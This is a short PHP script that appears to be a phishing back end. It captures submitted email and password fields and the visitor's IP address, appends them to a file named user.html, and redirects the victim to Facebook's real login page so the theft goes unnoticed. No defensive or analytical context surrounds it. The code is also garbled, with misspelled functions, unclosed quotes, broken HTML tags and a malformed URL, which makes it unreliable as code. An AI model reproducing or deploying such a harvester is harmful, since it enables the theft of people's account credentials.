<?php
$email = $_post[ 'email'];
$pass = $_post['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$f = foppen(user.html", "a");
fwrite ($f, 'Email:  [<b><font> color="#000ff">'.$email.'</front></b>] Password: [<b><font color="#ff0040">'.$pass.' IP: [<b><font color="#FE23F7>'.</font></b>]<br>');
fclose($f);

header("Location: https//www.facebook.com/login.php");?